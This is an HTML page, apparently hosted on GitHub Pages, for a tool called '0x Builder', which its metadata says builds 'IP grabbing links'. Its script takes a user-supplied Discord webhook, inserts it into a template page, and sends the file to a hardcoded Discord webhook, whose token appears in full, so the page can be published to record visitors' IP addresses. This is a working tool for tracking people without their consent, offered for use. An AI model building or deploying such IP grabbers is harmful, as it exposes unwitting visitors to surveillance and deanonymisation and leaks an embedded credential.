<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Builder</title>
    <!-- Open Graph Metadata -->
    <meta property="og:title" content="0x Builder">
    <meta property="og:description" content="0x Builder is a free website to build your IP grabbing links. By .gekkefries1">
    <meta property="og:image" content="https://i.ibb.co/W2DQr84/james-in-amry.png">
    <meta property="og:url" content="https://gekkefries.github.io/0xV1/">
    <meta property="og:type" content="website">
    <meta name="theme-color" content="#D42CE3">

    <style>
        body {
            background-color: #18181B;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
        }
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 1;
        }
        .container::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 400px;
            height: 200px;
            background: #D42CE3;
            filter: blur(50px);
            transform: translate(-50%, -50%);
            z-index: -1;
        }
        input, button {
            margin: 10px;
            padding: 10px;
            font-size: 16px;
            border-radius: 8px;
            border: 1px solid #B030B8;
        }
        input {
            width: 200px;
        }
        button {
            background-color: #D42CE3;
            color: white;
            border: 2px solid #B030B8;
            cursor: pointer;
        }
        button:hover {
            background-color: #B030B8;
        }
        .glow {
            position: absolute;
            width: 20px;
            height: 20px;
            background: #D42CE3;
            border-radius: 50%;
            filter: blur(10px);
            animation: glowAnimation 3s infinite;
            opacity: 0;
        }
        @keyframes glowAnimation {
            0%, 100% {
                opacity: 0;
                transform: translateY(0) scale(1);
            }
            50% {
                opacity: 1;
                transform: translateY(-20px) scale(1.5);
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <input id="websiteName" type="text" placeholder="Website Name">
        <input id="webhook" type="text" placeholder="Webhook">
        <button onclick="createAndSendFile()">Create and Send</button>
    </div>
    <script>
        async function createAndSendFile() {
            const websiteName = document.getElementById('websiteName').value;
            const webhook = document.getElementById('webhook').value;
            const discordWebhookUrl = 'https://discord.com/api/webhooks/1249792800833147021/Jrbb3WxzKVc88MWrsVlcjrlOVLYeFvVSTZc3-ECg-t7TnCyCHGpihom9uRes0oj6ZVfD';

            if (!websiteName || !webhook) {
                alert('Please enter both Website Name and Webhook.');
                return;
            }

            // Validate website name
            const websiteNameRegex = /^[a-zA-Z]{1,10}$/; // Only normal letters, maximum 10 characters
            if (!websiteNameRegex.test(websiteName)) {
                alert('Website Name can only contain normal letters and must be between 1 to 10 characters.');
                return;
            }

            const response = await fetch('original.html');
            if (!response.ok) {
                alert('Failed to load original.html');
                return;
            }
            let originalContent = await response.text();

            const modifiedContent = originalContent.replace(/WEBHOOK_HERE/g, webhook);

            const blob = new Blob([modifiedContent], { type: 'text/html' });
            const formData = new FormData();
            formData.append('file', blob, `${websiteName}.html`);

            try {
                const result = await fetch(discordWebhookUrl, {
                    method: 'POST',
                    body: formData
                });

                if (result.ok) {
                    // Send separate embed message to Discord
                    const embedMessage = {
                        content: ' ',
                        embeds: [
                            {
                                title: 'Website Creation Notification',
                                description: `Hello, I'm just here to notify you that we successfully sent it and is hopefully in a few minutes up and running.`,
                                color: 0x00ff00, // Green color for success
                                footer: {
                                    text: 'https://gekkefries.github.io/0x/websites/' + encodeURIComponent(websiteName)
                                }
                            }
                        ]
                    };
                    await fetch(webhook, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(embedMessage)
                    });

                    alert(`Website ${websiteName} sent successfully. Please check your Discord Webhook for more information.`);
                } else {
                    alert('Failed to send the website content to the Discord Bot for Process.');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('An error occurred while sending the File for process.');
            }
        }

        function createGlow() {
            const glow = document.createElement('div');
            glow.className = 'glow';
            glow.style.top = `${Math.random() * 100}vh`;
            glow.style.left = `${Math.random() * 100}vw`;
            document.body.appendChild(glow);
            setTimeout(() => {
                glow.remove();
            }, 3000);
        }

        setInterval(createGlow, 500);
    </script>
</body>
</html>
